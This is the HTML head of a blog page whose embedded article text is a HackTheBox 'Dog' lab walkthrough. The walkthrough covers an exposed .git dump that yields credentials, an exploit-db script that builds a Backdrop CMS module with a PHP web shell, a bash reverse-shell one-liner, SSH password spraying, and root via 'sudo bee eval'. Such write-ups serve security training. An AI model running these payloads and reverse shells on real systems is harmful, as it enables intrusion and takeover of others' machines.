<!DOCTYPE html>
<html lang="en" dir="auto">

<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>HackTheBox - Dog Writeup | 0xblivion.dev</title>
<meta name="keywords" content="HackTheBox, Backdrop CMS, Web Exploitation, Git Exposure, Remote Code Execution, Privilege Escalation, Linux, CTF, PHP Exploitation, Information Disclosure">
<meta name="description" content="Overview

This box focuses on web application vulnerabilities, specifically a misconfigured Git repository and a vulnerable Backdrop CMS. We start by discovering an exposed .git directory, which allows us to dump the repository and uncover database credentials. These credentials lead to an authenticated web panel, where we exploit a known Remote Code Execution (RCE) vulnerability in Backdrop CMS to gain an initial shell as www-data. For privilege escalation, we discover that a user (johncusack) can execute a PHP utility (bee) as root, which we then abuse to spawn a root shell.">
<meta name="author" content="0xblivion">
<link rel="canonical" href="http://localhost:1313/posts/htb/linux/easy/hackthebox---dog-writeup/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.7bb9e509f32b776e3778b3ea8539776721782bd73f8019534361265046bfd155.css" integrity="sha256-e7nlCfMrd243eLPqhTl3ZyF4K9c/gBlTQ2EmUEa/0VU=" rel="preload stylesheet" as="style">
<link rel="icon" href="http://localhost:1313/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="http://localhost:1313/posts/htb/linux/easy/hackthebox---dog-writeup/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
</noscript><meta property="og:url" content="http://localhost:1313/posts/htb/linux/easy/hackthebox---dog-writeup/">
  <meta property="og:site_name" content="0xblivion.dev">
  <meta property="og:title" content="HackTheBox - Dog Writeup">
  <meta property="og:description" content="Overview This box focuses on web application vulnerabilities, specifically a misconfigured Git repository and a vulnerable Backdrop CMS. We start by discovering an exposed .git directory, which allows us to dump the repository and uncover database credentials. These credentials lead to an authenticated web panel, where we exploit a known Remote Code Execution (RCE) vulnerability in Backdrop CMS to gain an initial shell as www-data. For privilege escalation, we discover that a user (johncusack) can execute a PHP utility (bee) as root, which we then abuse to spawn a root shell.">
  <meta property="og:locale" content="en-us">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2025-03-28T00:00:00+00:00">
    <meta property="article:modified_time" content="2025-03-28T00:00:00+00:00">
    <meta property="article:tag" content="HackTheBox">
    <meta property="article:tag" content="Backdrop CMS">
    <meta property="article:tag" content="Web Exploitation">
    <meta property="article:tag" content="Git Exposure">
    <meta property="article:tag" content="Remote Code Execution">
    <meta property="article:tag" content="Privilege-Escalation">
      <meta property="og:image" content="https://0xblivion.dev/img/favicon.png">
  
  <meta name="author" content="0xblivion">
  <meta property="article:author" content="0xblivion">
  <meta property="og:article:author" content="0xblivion">
  <script type="application/ld+json">
    {
      "@context": "https://schema.org",
      "@type": "Article",
      "author": {
        "@type": "Person",
        "name": "0xblivion"
      }
    }
  </script>
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://0xblivion.dev/img/favicon.png">
<meta name="twitter:title" content="HackTheBox - Dog Writeup">
<meta name="twitter:description" content="Overview

This box focuses on web application vulnerabilities, specifically a misconfigured Git repository and a vulnerable Backdrop CMS. We start by discovering an exposed .git directory, which allows us to dump the repository and uncover database credentials. These credentials lead to an authenticated web panel, where we exploit a known Remote Code Execution (RCE) vulnerability in Backdrop CMS to gain an initial shell as www-data. For privilege escalation, we discover that a user (johncusack) can execute a PHP utility (bee) as root, which we then abuse to spawn a root shell.">


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "http://localhost:1313/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "HackTheBox - Dog Writeup",
      "item": "http://localhost:1313/posts/htb/linux/easy/hackthebox---dog-writeup/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "HackTheBox - Dog Writeup",
  "name": "HackTheBox - Dog Writeup",
  "description": "Overview This box focuses on web application vulnerabilities, specifically a misconfigured Git repository and a vulnerable Backdrop CMS. We start by discovering an exposed .git directory, which allows us to dump the repository and uncover database credentials. These credentials lead to an authenticated web panel, where we exploit a known Remote Code Execution (RCE) vulnerability in Backdrop CMS to gain an initial shell as www-data. For privilege escalation, we discover that a user (johncusack) can execute a PHP utility (bee) as root, which we then abuse to spawn a root shell.\n",
  "keywords": [
    "HackTheBox", "Backdrop CMS", "Web Exploitation", "Git Exposure", "Remote Code Execution", "Privilege Escalation", "Linux", "CTF", "PHP Exploitation", "Information Disclosure"
  ],
  "articleBody": "Overview This box focuses on web application vulnerabilities, specifically a misconfigured Git repository and a vulnerable Backdrop CMS. We start by discovering an exposed .git directory, which allows us to dump the repository and uncover database credentials. These credentials lead to an authenticated web panel, where we exploit a known Remote Code Execution (RCE) vulnerability in Backdrop CMS to gain an initial shell as www-data. For privilege escalation, we discover that a user (johncusack) can execute a PHP utility (bee) as root, which we then abuse to spawn a root shell.\n+ − ⌂ [https://i.ibb.co/JjzkJ3NR/user-removebg-preview.png]Nmap Scan [https://i.ibb.co/HDPF8ZMm/website-removebg-preview-1.png]Access .git Directory [https://i.ibb.co/Kckn13Nh/database-removebg-preview.png]Extract settings.php → DB Creds [https://i.ibb.co/HDPF8ZMm/website-removebg-preview-1.png]Login as CMS User [https://i.ibb.co/ksTD4Kyw/bug-malicious-removebg-preview.png]Upload Malicious Module (RCE) [https://i.ibb.co/Gwv4v4g/shell-exploit-removebg-preview.png]Trigger Web Shell (www-data) [https://i.ibb.co/0ybfPw9J/password-removebg-preview.png]Password Spray SSH Users [https://i.ibb.co/JR4shsmH/login-removebg-preview.png]SSH as johncusack [https://i.ibb.co/LzdxQFPv/computer-removebg-preview.png]Run `sudo bee` to Eval PHP [https://i.ibb.co/679DN5x7/rooted-removebg-preview.png]Gain Root Access TEST ATTACK PATH LANG TO :D 1. Kicking Off with Nmap As always, we start with an nmap scan to see what services are running on the target. 0xblivion@fluffy: ~ root@0xblivion:~# sudo nmap -sVC -oA nmap/dog 10.10.11.58 -vv # Nmap 7.95 scan initiated Wed Jul 2 16:25:44 2025 as: /usr/lib/nmap/nmap -sVC -oA nmap/dog -vv 10.10.11.58 Nmap scan report for 10.10.11.58 Host is up, received echo-reply ttl 63 (0.055s latency). Scanned at 2025-07-02 16:25:44 EDT for 9s Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 97:2a:d2:2c:89:8a:d3:ed:4d:ac:00:d2:1e:87:49:a7 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDEJsqBRTZaxqvLcuvWuqOclXU1uxwUJv98W1TfLTgTYqIBzWAqQR7Y6fXBOUS6FQ9xctARWGM3w3AeDw+MW0j+iH83gc9J4mTFTBP8bXMgRqS2MtoeNgKWozPoy6wQjuRSUammW772o8rsU2lFPq3fJCoPgiC7dR4qmrWvgp5TV8GuExl7WugH6/cTGrjoqezALwRlKsDgmAl6TkAaWbCC1rQ244m58ymadXaAx5I5NuvCxbVtw32/eEuyqu+bnW8V2SdTTtLCNOe1Tq0XJz3mG9rw8oFH+Mqr142h81jKzyPO/YrbqZi2GvOGF+PNxMg+4kWLQ559we+7mLIT7ms0esal5O6GqIVPax0K21+GblcyRBCCNkawzQCObo5rdvtELh0CPRkBkbOPo4CfXwd/DxMnijXzhR/lCLlb2bqYUMDxkfeMnmk8HRF+hbVQefbRC/+vWf61o2l0IFEr1IJo3BDtJy5m2IcWCeFX3ufk5Fme8LTzAsk6G9hROXnBZg8= | 256 27:7c:3c:eb:0f:26:e9:62:59:0f:0f:b1:38:c9:ae:2b (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBM/NEdzq1MMEw7EsZsxWuDa+kSb+OmiGvYnPofRWZOOMhFgsGIWfg8KS4KiEUB2IjTtRovlVVot709BrZnCvU8Y= | 256 93:88:47:4c:69:af:72:16:09:4c:ba:77:1e:3b:3b:eb (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPMpkoATGAIWQVbEl67rFecNZySrzt944Y/hWAyq4dPc 80/tcp open http syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu)) | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS | http-git: | 10.10.11.58:80/.git/ | Git repository found! | Repository description: Unnamed repository; edit this file 'description' to name the... |_ Last commit message: todo: customize url aliases. reference:https://docs.backdro... |_http-generator: Backdrop CMS 1 (https://backdropcms.org) |_http-title: Home | Dog | http-robots.txt: 22 disallowed entries | /core/ /profiles/ /README.md /web.config /admin | /comment/reply /filter/tips /node/add /search /user/register | /user/password /user/login /user/logout /?q=admin /?q=comment/reply | /?q=filter/tips /?q=node/add /?q=search /?q=user/password |_/?q=user/register /?q=user/login /?q=user/logout |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-favicon: Unknown favicon MD5: 3836E83A3E835A26D789DDA9E78C5510 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Read data files from: /usr/share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed Jul 2 16:25:53 2025 -- 1 IP address (1 host up) scanned in 9.54 seconds copy From the Nmap output, we observe an open SSH port (22/tcp) and an HTTP server (80/tcp) running Apache. The HTTP server reveals a .git/ directory, indicating a Git repository, and identifies the web application as Backdrop CMS.\n2. Enumeration We’ll run gobuster in the background to discover more directories and files on the web server. 0xblivion@fluffy: ~ root@0xblivion:~# gobuster dir -u http://10.10.11.58/ -w /opt/SecLists/Discovery/Web-Content/raft-medium-words.txt =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.11.58/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /opt/SecLists/Discovery/Web-Content/raft-medium-words.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /modules (Status: 301) [Size: 312] [--\u003e http://10.10.11.58/modules/] /.php (Status: 403) [Size: 276] /.html (Status: 403) [Size: 276] /themes (Status: 301) [Size: 311] [--\u003e http://10.10.11.58/themes/] /.htm (Status: 403) [Size: 276] /files (Status: 301) [Size: 310] [--\u003e http://10.10.11.58/files/] /sites (Status: 301) [Size: 310] [--\u003e http://10.10.11.58/sites/] /core (Status: 301) [Size: 309] [--\u003e http://10.10.11.58/core/] /.htaccess (Status: 403) [Size: 276] /.phtml (Status: 403) [Size: 276] /layouts (Status: 301) [Size: 312] [--\u003e http://10.10.11.58/layouts/] /.htc (Status: 403) [Size: 276] /.html_var_DE (Status: 403) [Size: 276] /server-status (Status: 403) [Size: 276] /.htpasswd (Status: 403) [Size: 276] /.git (Status: 301) [Size: 309] [--\u003e http://10.10.11.58/.git/] /.html. (Status: 403) [Size: 276] /.html.html (Status: 403) [Size: 276] /.htpasswds (Status: 403) [Size: 276] /.htm. (Status: 403) [Size: 276] /.htmll (Status: 403) [Size: 276] /.phps (Status: 403) [Size: 276] /.html.old (Status: 403) [Size: 276] /.ht (Status: 403) [Size: 276] /.html.bak (Status: 403) [Size: 276] /.htm.htm (Status: 403) [Size: 276] /.hta (Status: 403) [Size: 276] /.htgroup (Status: 403) [Size: 276] /.html1 (Status: 403) [Size: 276] /.html.LCK (Status: 403) [Size: 276] /.html.printable (Status: 403) [Size: 276] /.htm.LCK (Status: 403) [Size: 276] /.htaccess.bak (Status: 403) [Size: 276] /.html.php (Status: 403) [Size: 276] /.htmls (Status: 403) [Size: 276] /.htx (Status: 403) [Size: 276] /.htlm (Status: 403) [Size: 276] /.htm2 (Status: 403) [Size: 276] /.html- (Status: 403) [Size: 276] /.htuser (Status: 403) [Size: 276] /.htacess (Status: 403) [Size: 276] /.htm.d (Status: 403) [Size: 276] /.htm.html (Status: 403) [Size: 276] /.htm.old (Status: 403) [Size: 276] /.html-1 (Status: 403) [Size: 276] /.html.orig (Status: 403) [Size: 276] /.html.sav (Status: 403) [Size: 276] /.html_ (Status: 403) [Size: 276] /.html_files (Status: 403) [Size: 276] /.htmlpar (Status: 403) [Size: 276] /.htmlprint (Status: 403) [Size: 276] /.hts (Status: 403) [Size: 276] Progress: 63088 / 63089 (100.00%) =============================================================== Finished =============================================================== copy The gobuster scan confirms the presence of the .git directory, which was also found by Nmap. Since Backdrop CMS is open-source, we’ll focus on the .git directory for potential information disclosure.\nDumping .git/ using git-dumper We’ll use git-dumper to extract the contents of the .git repository from the web server.\n0xblivion@fluffy: ~ root@0xblivion:~# mkdir git-dump; git-dumper http://10.10.11.58/ git-dump/ [~] Testing http://10.10.11.58/.git/HEAD [200] [~] Testing http://10.10.11.58/.git/ [200] [~] Fetching .git recursively [~] Fetching http://10.10.11.58/.gitignore [404] [~] http://10.10.11.58/.gitignore responded with status code 404 [~] Fetching http://10.10.11.58/.git/ [200] [~] Fetching http://10.10.11.58/.git/objects/ [200] [~] Fetching http://10.10.11.58/.git/HEAD [200] [~] Fetching http://10.10.11.58/.git/COMMIT_EDITMSG [200] [~] Fetching http://10.10.11.58/.git/config [200] [~] Fetching http://10.10.11.58/.git/branches/ [200] [~] Fetching http://10.10.11.58/.git/hooks/ [200] [~] Fetching http://10.10.11.58/.git/description [200] [~] Fetching http://10.10.11.58/.git/logs/ [200] [~] Fetching http://10.10.11.58/.git/refs/ [200] ...SNIP.. copy DB Password Within the dumped .git repository, we found a settings.php file in the root directory that contains database credentials. 0xblivion@fluffy: ~ root@0xblivion:~# head -n 16 settings.php \u003c?php /** * @file * Main Backdrop CMS configuration file. */ /** * Database configuration: * * Most sites can configure their database by entering the connection string * below. If using primary/replica databases or multiple connections, see the * advanced database documentation at * https://api.backdropcms.org/database-configuration */ $database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop'; $database_prefix = ''; copy The credentials found are root:BackDropJ2024DS2024.\nWe attempted to log in to the website’s admin panel using these credentials, but root was not a valid username.\nFinding a valid user We used grep to recursively search for strings containing dog.htb within the dumped Git repository, hoping to find valid usernames.\n0xblivion@fluffy: ~ root@0xblivion:~# grep -Ri dog.htb files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/update.settings.json: \"tiffany@dog.htb\" .git/logs/HEAD:0000000000000000000000000000000000000000 8204779c764abd4c9d8d95038b6d22b6a7515afa root 1738963331 +0000 commit (initial): todo: customize url aliases. reference:https://docs.backdropcms.org/documentation/url-aliases .git/logs/refs/heads/master:0000000000000000000000000000000000000000 8204779c764abd4c9d8d95038b6d22b6a7515afa root 1738963331 +0000 commit (initial): todo: customize url aliases. reference:https://docs.backdropcms.org/documentation/url-aliases copy We found a potential username: tiffany@dog.htb.\nWe added the domain to our /etc/hosts file for easier access. 0xblivion@fluffy: ~ root@0xblivion:~# echo \"10.10.11.58 dog.htb\" | sudo tee -a /etc/hosts copy Using tiffany as the username and BackDropJ2024DS2024 as the password, we were able to log into the Backdrop CMS admin panel.\n3. Foothold and User flag Now that we have authenticated access to the Backdrop CMS admin panel, we’ll look for a way to gain a shell. We searched for exploits related to “Backdrop CMS” and found an authenticated RCE exploit on exploit-db.\nhttps://www.exploit-db.com/exploits/52021 The exploit script generates a malicious module (shell.zip) that can be uploaded to the CMS.\n#!/usr/bin/env python3 # Exploit Title: Backdrop CMS 1.27.1 - Authenticated Remote Command Execution (RCE) # Date: 04/27/2024 # Exploit Author: Ahmet Ümit BAYRAM # Vendor Homepage: https://backdropcms.org/ # Software Link: https://github.com/backdrop/backdrop/releases/download/1.27.1/backdrop.zip # Version: latest # Tested on: MacOS import os import time import zipfile def create_files(): info_content = \"\"\" type = module name = Block description = Controls the visual building blocks a page is constructed with. Blocks are boxes of content rendered into an area, or region, of a web page. package = Layouts tags[] = Blocks tags[] = Site Architecture version = BACKDROP_VERSION backdrop = 1.x configure = admin/structure/block ; Added by Backdrop CMS packaging script on 2024-03-07 project = backdrop version = 1.27.1 timestamp = 1709862662 \"\"\" shell_info_path = \"shell/shell.info\" os.makedirs(os.path.dirname(shell_info_path), exist_ok=True) # Klasörüoluşturur with open(shell_info_path, \"w\") as file: file.write(info_content) shell_content = \"\"\" \u003c?php if(isset($_GET['cmd'])) { system($_GET['cmd']); } ?\u003e \"\"\" shell_php_path = \"shell/shell.php\" with open(shell_php_path, \"w\") as file: file.write(shell_content) return shell_info_path, shell_php_path def create_zip(info_path, php_path): zip_filename = \"shell.zip\" with zipfile.ZipFile(zip_filename, 'w') as zipf: zipf.write(info_path, arcname='shell/shell.info') zipf.write(php_path, arcname='shell/shell.php') return zip_filename def main(url): print(\"Backdrop CMS 1.27.1 - Remote Command Execution Exploit\") time.sleep(3) print(\"Evil module generating...\") time.sleep(2) info_path, php_path = create_files() zip_filename = create_zip(info_path, php_path) print(\"Evil module generated!\", zip_filename) time.sleep(2) print(\"Go to \" + url + \"/admin/modules/install and upload the \" + zip_filename + \" for Manual Installation.\") time.sleep(2) print(\"Your shell address:\", url + \"/modules/shell/shell.php\") if __name__ == \"__main__\": import sys if len(sys.argv) \u003c 2: print(\"Usage: python script.py [url]\") else: main(sys.argv[1]) Exploit Running the Python script: 0xblivion@fluffy: ~ root@0xblivion:~# ./exploit.py http://10.10.11.58/ Backdrop CMS 1.27.1 - Remote Command Execution Exploit Evil module generating... Evil module generated! shell.zip Go to http://10.10.11.58//admin/modules/install and upload the shell.zip for Manual Installation. Your shell address: http://10.10.11.58//modules/shell/shell.php copy The script instructs us to upload shell.zip via the “Manual Installation” option in the CMS admin panel (http://dog.htb/admin/modules/install).\nFunctionality \u003e Install new modules \u003e Manual Installation\nHowever, the CMS only accepts .tar.gz files for manual installation. We need to compress the shell/ directory generated by the script into a .tar.gz archive.\n0xblivion@fluffy: ~ root@0xblivion:~# tar -czf shell.tar.gz shell/ root@0xblivion:~# ls shell shell.tar.gz shell.zip exploit.py git-dump copy Now, we can upload shell.tar.gz through the “Manual installation” page.\nAfter successful installation, we can access our web shell at http://dog.htb/modules/shell/shell.php\nThe web shell confirms we are running as the www-data user. We’ll use a reverse shell to get a more stable connection.\nbash -c 'bash -i \u003e\u0026 /dev/tcp// 0\u003e\u00261' On our attacking machine, we set up a netcat listener: 0xblivion@fluffy: ~ root@0xblivion:~# nc -lnvp 9001 listening on [any] 9001 ... connect to [10.10.15.7] from (UNKNOWN) [10.10.11.58] 54688 bash: cannot set terminal process group (929): Inappropriate ioctl for device bash: no job control in this shell www-data@dog:/var/www/html/modules/shell$ copy We upgrade the shell to an interactive TTY: 0xblivion@fluffy: ~ www-data@dog:/var/www/html/modules/shell$ script -q /dev/null -c bash copy Then, CTRL+Z to background the shell, followed by stty raw -echo; fg and pressing Enter twice. 0xblivion@fluffy: ~ stty raw -echo; fg [2] - continued nc -lnvp 9001 www-data@dog:/var/www/html/modules/shell$ copy We also adjust the TTY dimensions for better usability:\n0xblivion@fluffy: ~ root@0xblivion:~# stty -a speed 38400 baud; rows 45; columns 238; line = 0; intr = ^C; quit = ^\\; erase = ^?; kill = ^U; eof = ^D; eol = ; eol2 = ; swtch = ; start = ^Q; stop = ^S; susp = ^Z; rprnt = ^R; werase = ^W; lnext = ^V; discard = ^O; min = 1; time = 0; -parenb -parodd -cmspar cs8 -hupcl -cstopb cread -clocal -crtscts -ignbrk -brkint -ignpar -parmrk -inpck -istrip -inlcr -igncr icrnl ixon -ixoff -iuclc -ixany -imaxbel iutf8 opost -olcuc -ocrnl onlcr -onocr -onlret -ofill -ofdel nl0 cr0 tab0 bs0 vt0 ff0 isig icanon iexten echo echoe echok -echonl -noflsh -xcase -tostop -echoprt echoctl echoke -flusho -extproc copy 0xblivion@fluffy: ~ www-data@dog:/var/www/html/modules/shell$ stty rows 45 cols 238 copy Actually, you don’t need to do this step since you can just find a user through the webshell. Now that we have a stable shell, we enumerate local users on the system. 0xblivion@fluffy: ~ www-data@dog:/var/www/html/modules/shell$ cat /etc/passwd | grep sh$ root:x:0:0:root:/root:/bin/bash jobert:x:1000:1000:jobert:/home/jobert:/bin/bash johncusack:x:1001:1001:,,,:/home/johncusack:/bin/bash copy We found three users with shell access: root, jobert, and johncusack. We’ll save these usernames to users.txt.\nWe use netexec to spray the database password (BackDropJ2024DS2024) against these users for SSH. 0xblivion@fluffy: ~ root@0xblivion:~# nxc ssh 10.10.11.58 -u users.txt -p 'BackDropJ2024DS2024' --continue-on-success SSH 10.10.11.58 22 10.10.11.58 [*] SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.12 SSH 10.10.11.58 22 10.10.11.58 [-] jobert:BackDropJ2024DS2024 SSH 10.10.11.58 22 10.10.11.58 [+] johncusack:BackDropJ2024DS2024 Linux - Shell access! copy The johncusack user’s password is BackDropJ2024DS2024. We can now SSH into the box as johncusack.\n0xblivion@fluffy: ~ root@0xblivion:~# ssh johncusack@dog.htb The authenticity of host 'dog.htb (10.10.11.58)' can't be established. ED25519 key fingerprint is SHA256:M3A+wMdtWP0tBPvp9OcRf6sPPmPmjfgNphodr912r1o. This host key is known by the following other names/addresses: ~/.ssh/known_hosts:6: [hashed name] Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added 'dog.htb' (ED25519) to the list of known hosts. johncusack@dog.htb's password: Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-208-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/pro System information as of Wed 02 Jul 2025 09:26:21 PM UTC System load: 0.0 Usage of /: 50.9% of 6.32GB Memory usage: 26% Swap usage: 0% Processes: 244 Users logged in: 0 IPv4 address for eth0: 10.10.11.58 IPv6 address for eth0: dead:beef::250:56ff:feb0:b9d2 Expanded Security Maintenance for Applications is not enabled. 0 updates can be applied immediately. Enable ESM Apps to receive additional future security updates. See https://ubuntu.com/esm or run: sudo pro status The list of available updates is more than a week old. To check for new updates run: sudo apt update Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings The programs included with the Ubuntu system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. Last login: Tue Mar 4 17:04:29 2025 from 10.10.15.7 johncusack@dog:~$ copy We are now logged in as johncusack. We can find the user flag in the home directory. 0xblivion@fluffy: ~ johncusack@dog:~$ ls user.txt johncusack@dog:~$ cat user.txt d305454bc5a53fb01aec080ec3a2ee33 copy User flag: d305454bc5a53fb01aec080ec3a2ee33\n4. Privilege Escalation to Root We check sudo -l to see what commands johncusack can run with sudo privileges.\n0xblivion@fluffy: ~ johncusack@dog:~$ sudo -l [sudo] password for johncusack: Matching Defaults entries for johncusack on dog: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User johncusack may run the following commands on dog: (ALL : ALL) /usr/local/bin/bee copy The user johncusack can execute /usr/local/bin/bee as root. We inspect the bee file.\n0xblivion@fluffy: ~ johncusack@dog:~$ file /usr/local/bin/bee /usr/local/bin/bee: symbolic link to /backdrop_tool/bee/bee.php copy It’s a symbolic link to /backdrop_tool/bee/bee.php. We can view the contents of bee.php:\n#!/usr/bin/env php \u003c?php /** * @file * A command line utility for Backdrop CMS. */ // Exit gracefully with a meaningful message if installed within a web // accessible location and accessed in the browser. if (!bee_is_cli()) { echo bee_browser_load_html(); die(); } // Set custom error handler. set_error_handler('bee_error_handler'); // Include files. require_once __DIR__ . '/includes/miscellaneous.inc'; require_once __DIR__ . '/includes/command.inc'; require_once __DIR__ . '/includes/render.inc'; require_once __DIR__ . '/includes/filesystem.inc'; require_once __DIR__ . '/includes/input.inc'; require_once __DIR__ . '/includes/globals.inc'; // Main execution code. bee_initialize_server(); bee_parse_input(); bee_initialize_console(); bee_process_command(); bee_print_messages(); bee_display_output(); exit(); /** * Custom error handler for `bee`. * * @param int $error_level * The level of the error. * @param string $message * Error message to output to the user. * @param string $filename * The file that the error came from. * @param int $line * The line number the error came from. * @param array $context * An array of all variables from where the error was triggered. * * @see https://www.php.net/manual/en/function.set-error-handler.php * @see _backdrop_error_handler() */ function bee_error_handler($error_level, $message, $filename, $line, array $context = NULL) { require_once __DIR__ . '/includes/errors.inc'; _bee_error_handler_real($error_level, $message, $filename, $line, $context); } /** * Detects whether the current script is running in a command-line environment. */ function bee_is_cli() { return (empty($_SERVER['SERVER_SOFTWARE']) \u0026\u0026 (php_sapi_name() == 'cli' || (is_numeric($_SERVER['argc']) \u0026\u0026 $_SERVER['argc'] \u003e 0))); } /** * Return the HTML to display if this page is loaded in the browser. * * @return string * The concatentated html to display. */ function bee_browser_load_html() { // Set the title to use in h1 and title elements. $title = \"Bee Gone!\"; // Place a white block over \"#!/usr/bin/env php\" as this is output before // anything else. $browser_output = \"\u0026nbsp;\"; // Add the bee logo and style appropriately. $browser_output .= \"\"; // Add meaningful text. $browser_output .= \"$title\"; $browser_output .= \"Bee is a command line tool only and will not work in the browser.\n\"; // Add the document title using javascript when the window loads. $browser_output .= \"\"; // Output the combined string. return $browser_output; } We check the bee command’s eval functionality.\n0xblivion@fluffy: ~ johncusack@dog:~$ sudo bee help eval eval, ev, php-eval Evaluate (run/execute) arbitrary PHP code after bootstrapping Backdrop. Arguments: code The PHP code to evaluate. Examples: bee eval '$node = node_load(1); print $node-\u003etitle;' Loads node with nid 1 and then prints its title. bee eval \"node_access_rebuild();\" Rebuild node access permissions. bee eval \"file_unmanaged_copy('$HOME/Pictures/image.jpg', 'public://image.jpg');\" Copies a file whose path is determined by an environment's variable. Note the use of double quotes so the variable $HOME gets replaced by its value. copy The bee command has an eval subcommand that allows us to execute arbitrary PHP code. To use it correctly, we need to specify the --root parameter pointing to the web root (/var/www/html). We can use this to spawn a root shell.\n0xblivion@fluffy: ~ johncusack@dog:~$ sudo /usr/local/bin/bee --root=/var/www/html eval \"system('/bin/bash -i');\" root@dog:/var/www/html# copy Or, if you need a reverse shell back to your machine (replace and ): 0xblivion@fluffy: ~ johncusack@dog:~$ sudo /usr/local/bin/bee --root=/var/www/html eval \\ \"system('bash -i \u003e\u0026 /dev/tcp// 0\u003e\u00261');\" copy Get the root.txt 0xblivion@fluffy: ~ root@dog:/var/www/html# id uid=0(root) gid=0(root) groups=0(root) root@dog:/var/www/html# cat /root/root.txt 83970a2d7e6797bf5f32b7a915dad3f7 copy Root flag: 83970a2d7e6797bf5f32b7a915dad3f7\n",
  "wordCount" : "2832",
  "inLanguage": "en",
  "image": "https://0xblivion.dev/img/favicon.png","datePublished": "2025-03-28T00:00:00Z",
  "dateModified": "2025-03-28T00:00:00Z",
  "author":{
    "@type": "Person",
    "name": "0xblivion"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "http://localhost:1313/posts/htb/linux/easy/hackthebox---dog-writeup/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "0xblivion.dev",
    "logo": {
      "@type": "ImageObject",
      "url": "http://localhost:1313/favicon.ico"
    }
  }
}
</script>
</head>

<body class=" dark" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="http://localhost:1313/" accesskey="h" title="0xblivion.dev (Alt + H)">0xblivion.dev</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="http://localhost:1313/" title="Home">
                    <span>Home</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/about/" title="About">
                    <span>About</span>
                </a>
            </li>
            <li>
